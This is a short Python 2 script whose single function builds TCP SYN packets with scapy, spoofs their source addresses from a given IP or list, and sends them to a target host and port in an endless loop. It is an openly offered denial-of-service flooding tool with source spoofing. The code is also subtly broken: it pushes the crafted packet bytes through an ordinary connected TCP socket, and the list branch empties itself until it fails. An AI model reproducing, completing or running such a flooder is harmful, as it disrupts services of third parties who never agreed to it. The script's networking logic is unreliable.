#!/usr/bin/env python

def sendpacket(Ip_range, destination, targetport):
    from scapy.all import IP, TCP
    import random
    import socket
    silva = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    silva.connect((destination, targetport))
    if type(Ip_range) != list:
       while 0 == 0:
             silva.send(bytes(IP(dst = str(destination), src = str(Ip_range), ttl=int(random.randint(80, 254)))/TCP(dport = int(targetport), sport = int(random.randint(1024, 65535)), flags = "S")))
             print 'package sent'       
    else: 
       while 0 == 0:
             sourceIP = random.choice(Ip_range)
             silva.send(bytes(IP(dst = str(destination), src = str(sourceIP), ttl=int(random.randint(80, 254)))/TCP(dport = int(targetport), sport = int(random.randint(1024, 65535)), flags = "S")))
             Ip_range.remove(sourceIP)
             print 'package sent'
             
